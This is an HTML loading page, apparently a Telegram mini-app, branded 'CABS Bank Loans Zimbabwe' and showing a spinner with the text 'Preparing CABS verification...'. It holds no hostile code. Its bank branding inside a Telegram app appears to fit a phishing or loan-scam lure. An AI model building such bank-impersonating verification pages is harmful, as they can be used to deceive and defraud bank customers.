<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CABS Bank Loans Zimbabwe - Processing</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --blue-primary: #003366;
            --blue-gradient: linear-gradient(180deg, #004488 0%, #002244 100%);
            --bg-dark: #001a33;
            --card-bg: #ffffff;
            --text-dark: #111111;
            --text-muted: #555555;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Centered Loading Card */
        .loading-card {
            background: var(--card-bg);
            width: 88%;
            max-width: 380px;
            padding: 45px 24px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Animated Spinner Circle */
        .loader-circle {
            width: 110px;
            height: 110px;
            background: var(--blue-gradient);
            border-radius: 50%;
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 6px 18px rgba(0, 51, 102, 0.35);
        }

        .loader-circle::after {
            content: '';
            width: 82px;
            height: 82px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Dynamic Status Typography */
        h2 {
            color: var(--blue-primary);
            font-size: 24px;
            margin: 0 0 10px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        p {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0;
            line-height: 1.5;
            font-weight: 500;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">Processing...</h2>
    <p id="sub-text">Preparing CABS verification...</p>
</div>
